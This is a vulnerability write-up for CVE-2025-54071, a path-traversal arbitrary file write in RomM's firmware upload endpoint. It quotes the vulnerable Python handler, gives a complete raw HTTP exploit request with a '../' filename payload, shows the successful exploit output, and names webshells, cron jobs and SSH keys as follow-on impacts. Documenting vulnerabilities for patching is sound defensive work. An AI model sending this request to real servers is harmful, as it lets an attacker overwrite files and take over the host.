# CVE-2025-54071 - RomM Authenticated Arbitrary File Write Vulnerability

## Overview

| Field | Value |
|-------|-------|
| CVE ID | CVE-2025-54071 |
| CVSS Score | 9.4 (Critical) |
| Affected Software | RomM (ROM Manager) |
| Affected Versions | <= 4.0.0-beta.3 |
| Fixed Version | 4.0.0-beta.4 |
| CWE | CWE-434 (Unrestricted Upload of File with Dangerous Type) |
| Vulnerability Type | Arbitrary File Write / Path Traversal |

## Exploit Result

**STATUS: SUCCESSFULLY EXPLOITED**

```
[+] Target file: /tmp/cve_2025_54071_poc.txt
[+] Response status: 200
[+] File content: CVE-2025-54071_POC_SUCCESS
EXPLOIT SUCCESSFUL - Arbitrary file write confirmed!
```

## Vulnerability Description

An authenticated arbitrary file write vulnerability exists in multiple endpoints of RomM. The best attack vector is `/api/firmware` endpoint which only requires a valid `platform_id` (auto-created during initial setup).

## Technical Analysis

### Vulnerable Endpoints

1. `/api/firmware` - **Best attack vector** (only needs platform_id)
2. `/api/saves` - Requires valid rom_id
3. `/api/states` - Requires valid rom_id

### Vulnerable Code

Location: `backend/handler/filesystem/firmware_handler.py`

```python
def write_file(self, file: UploadFile, path: str) -> None:
    if not file.filename:
        log.error("No file name provided")
        return

    Path(path).mkdir(parents=True, exist_ok=True)
    file_location = os.path.join(path, file.filename)  # <-- VULNERABLE

    with open(file_location, "wb") as f:
        shutil.copyfileobj(file.file, f)
```

The `file.filename` is directly used without path traversal validation.

### Exploit Request

```http
POST /api/firmware?platform_id=1 HTTP/1.1
Host: target:8080
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="files"; filename="../../../../../tmp/malicious.txt"
Content-Type: application/octet-stream

malicious content here
------Boundary--
```

### Attack Path Analysis

Base path: `/romm/library/bios/{platform}/`
Payload filename: `../../../../../tmp/target.txt`
Result path: `/romm/library/bios/snes/../../../../../tmp/target.txt` -> `/tmp/target.txt`

## Impact

- **Remote Code Execution**: Write PHP webshells, cron jobs, or SSH keys
- **System Compromise**: Full system compromise possible
- **Data Tampering**: Overwrite sensitive configuration files

## Prerequisites

- Valid authentication with `FIRMWARE_WRITE` scope (admin role has this)
- A valid platform_id (created automatically during setup)

## Remediation

Upgrade to RomM version 4.0.0-beta.4 or later.

## References

- GitHub Advisory: https://github.com/rommapp/romm/security/advisories/GHSA-fgxf-hggc-qqmq
- Fix Commit: https://github.com/rommapp/romm/commit/89248d03805e5fabca78443dd202ff32e0b4d9f3
